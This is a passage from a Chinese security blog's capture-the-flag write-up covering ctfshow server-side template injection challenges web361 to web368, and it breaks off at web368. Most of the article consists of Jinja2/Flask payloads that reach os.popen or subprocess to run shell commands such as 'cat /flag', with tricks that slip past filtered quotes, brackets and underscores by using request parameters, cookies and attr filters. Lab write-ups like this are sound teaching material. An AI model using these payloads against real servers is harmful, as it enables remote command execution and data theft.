@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web入门_SSTI | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="web361-372">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web入门_SSTI">
+<meta property="og:url" content="https://4reexile.github.io/article/ctfshow-webbasic-ssti/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="web361-372">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-12-02T13:25:01.000Z">
+<meta property="article:modified_time" content="2024-12-08T11:20:19.775Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="绕过">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="构造字符">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/ctfshow-webbasic-ssti/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Web入门_SSTI',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-08 19:20:19'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Web入门_SSTI</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-12-02T13:25:01.000Z" title="Created 2024-12-02 21:25:01">2024-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-12-08T11:20:19.775Z" title="Updated 2024-12-08 19:20:19">2024-12-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow%E9%9D%B6%E5%9C%BA/">ctfshow靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">835</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>Web入门_SSTI</h1>
+<hr>
+<p>服务器端模板注入, 服务端接收攻击者的恶意输入以后, 未经任何处理就将其作为 Web 应用模板内容的一部分; 模板引擎在进行目标编译渲染的过程中,执行了攻击者插入的语句</p>
+<h2 id="web361"><a class="header-anchor" href="#web361">¶</a>web361</h2>
+<ul>
+<li>描述: 名字就是考点</li>
+</ul>
+<p>GET传参<code>?name=&#123;&#123;7*7&#125;&#125;</code>, 返回49, 说明此处为利用点; 用最传统的popen方法来执行命令</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;more /flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web362"><a class="header-anchor" href="#web362">¶</a>web362</h2>
+<ul>
+<li>描述: 开始过滤</li>
+</ul>
+<p>过滤了2,3等数据, 使得<code>os._wrap_close</code>这个类没法使用, 但是我们还是用的popen构造; 或者利用flask的内置方法执行命令</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /f*&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment"># 运算获得同样的数据:</span></span><br><span class="line">?name=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">140</span>-<span class="number">8</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>]<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="comment"># flask的内置lipsum方法, 自带os模块</span></span><br><span class="line">?name=&#123;&#123;lipsum.__globals__.get(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web363"><a class="header-anchor" href="#web363">¶</a>web363</h2>
+<ul>
+<li>描述: 同上</li>
+</ul>
+<p>单引号被过滤, 可以使用<code>request.args.x</code>代替, 这个需要启用<code>os._wrap_close</code>模块, 发现在132位置有这个模块</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 所有模块</span></span><br><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>利用该模块传参</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;x.__init__.__globals__[request.args.x1].<span class="built_in">eval</span>(request.args.x2)&#125;&#125;&amp;x1=__builtins__&amp;x2=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()&amp;x=().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>]</span><br><span class="line"></span><br><span class="line">?name=&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[request.args.popen](request.args.param).read()&#125;&#125;&amp;popen=popen&amp;param=cat+/flag</span><br></pre></td></tr></table></figure>
+<p>还可以换一个get传参绕过</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">407</span>](request.args.a,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>]&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>
+<h2 id="web364"><a class="header-anchor" href="#web364">¶</a>web364</h2>
+<ul>
+<li>描述: 同上</li>
+</ul>
+<p>禁用了<code>args</code>, 可以使用<code>request.values.a</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">407</span>](request.values.a,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>]&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>
+<p>利用<code>cookie</code>传参:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">80</span>].__init__.__globals__[request.cookies.x1].<span class="built_in">eval</span>(request.cookies.x2)&#125;&#125; </span><br><span class="line"><span class="comment"># cookie</span></span><br><span class="line">x1=__builtins__;x2=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024221716.png" alt="image.png"></p>
+<h2 id="web365"><a class="header-anchor" href="#web365">¶</a>web365</h2>
+<ul>
+<li>描述: 同上</li>
+</ul>
+<p>过滤方括号, 用魔术方法<strong>getitem</strong>来代替方括号</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">407</span>)(request.values.a,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate().__getitem__(<span class="number">0</span>)&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>
+<h2 id="web366"><a class="header-anchor" href="#web366">¶</a>web366</h2>
+<ul>
+<li>描述: 同上</li>
+</ul>
+<p>过滤中括号, 下划线, 单引号, 双引号, globals, getitem args; 换一个类获取popen方法, 这个是flask的内置类</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.a).read()&#125;&#125;&amp;a =cat /flag</span><br></pre></td></tr></table></figure>
+<p>再利用filters中的attr来过滤下划, <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/#attr">官方文档</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure>
+<p>或者不换, 用flask过滤器, <code>&quot;&quot;|attr(&quot;__class__&quot;)</code>相当于<code>&quot;&quot;.__class__</code></p>
+<blockquote>
+<p>x是jiaja2框架中的特殊类, 此处<code>x.__init__</code>变成了类的实例</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="built_in">eval</span>(request.cookies.x5)&#125;&#125;</span><br><span class="line"><span class="comment"># cookie:</span></span><br><span class="line">x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+<h2 id="web367"><a class="header-anchor" href="#web367">¶</a>web367</h2>
+<ul>
+<li>描述: 同上</li>
+</ul>
+<p>过滤了os, 可以通过GET传参绕过,或者直接用web366的也行; payload如下:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.e)).read()&#125;&#125;&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;e=tac /flag</span><br></pre></td></tr></table></figure>
+<h2 id="web368"><a class="header-anchor" href="#web368">¶</a>web368</h2>
+<ul>
+<li>描述: 同上</li>
+</ul>
+<p>过滤了`</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/ctfshow-webbasic-ssti/">https://4reexile.github.io/article/ctfshow-webbasic-ssti/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87/">绕过</a><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a><a class="post-meta__tags" href="/tags/%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6/">构造字符</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/ctfshow-webbasic-xxe/" title="Web入门_XXE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Web入门_XXE</div></div></a></div><div class="next-post pull-right"><a href="/article/ctfshow-webbasic-ssrf/" title="Web入门_SSRF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Web入门_SSRF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/IMF-1/" title="IMF-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">IMF-1</div></div></a></div><div><a href="/article/php/" title="PHP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-08</div><div class="title">PHP</div></div></a></div><div><a href="/article/rce/" title="RCE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-08</div><div class="title">RCE</div></div></a></div><div><a href="/article/sql-injection/" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-24</div><div class="title">SQL注入</div></div></a></div><div><a href="/article/Stapler-1/" title="Stapler-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-28</div><div class="title">Stapler-1</div></div></a></div><div><a href="/article/ctfshow-webbasic-ssrf/" title="Web入门_SSRF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-02</div><div class="title">Web入门_SSRF</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Web入门_SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web361"><span class="toc-number">1.1.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web362"><span class="toc-number">1.2.</span> <span class="toc-text">web362</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web363"><span class="toc-number">1.3.</span> <span class="toc-text">web363</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web364"><span class="toc-number">1.4.</span> <span class="toc-text">web364</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web365"><span class="toc-number">1.5.</span> <span class="toc-text">web365</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web366"><span class="toc-number">1.6.</span> <span class="toc-text">web366</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web367"><span class="toc-number">1.7.</span> <span class="toc-text">web367</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web368"><span class="toc-number">1.8.</span> <span class="toc-text">web368</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
